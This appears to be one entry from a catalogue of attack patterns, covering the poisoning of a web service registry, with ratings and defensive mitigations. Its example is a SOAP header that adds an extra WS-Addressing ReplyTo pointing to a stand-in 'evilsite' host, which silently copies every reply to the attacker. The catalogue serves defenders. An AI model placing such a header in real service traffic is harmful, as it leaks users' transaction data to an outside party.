51,Poison Web Service Registry,"SOA and Web Services often use a registry to perform look up, get schema information, and metadata about services. A poisoned registry can redirect (think phishing for servers) the service requester to a malicious service provider, provide incorrect information in schema or metadata, and delete information about service provider interfaces.",High,Very High,::Design: Enforce principle of least privilege::Design: Harden registry server and file access permissions::Implementation: Implement communications to and from the registry using secure protocols::,"::WS-Addressing provides location and metadata about the service endpoints. An extremely hard to detect attack is an attacker who updates the WS-Addressing header, leaves the standard service request and service provider addressing and header information intact, but adds an additional WS-Addressing Replyto header. In this case the attacker is able to send a copy (like a cc in mail) of every result the service provider generates. So every query to the bank account service, would generate a reply message of the transaction status to both the authorized service requester and an attacker service. This would be extremely hard to detect at runtime. <S:Header><wsa:MessageID>http://example.com/Message </wsa:MessageID><wsa:ReplyTo><wsa:Address>http://valid.example/validClient</wsa:Address> </wsa:ReplyTo><wsa:ReplyTo><wsa:Address>http://evilsite/evilClient</wsa:Address> </wsa:ReplyTo><wsa:FaultTo><wsa:Address>http://validfaults.example/ErrorHandler</wsa:Address> </wsa:FaultTo> </S:Header> In this example evilsite is an additional reply to address with full access to all the messages that the authorized (validClient) has access to. Since this is registered with ReplyTo header it will not generate a Soap fault.::"
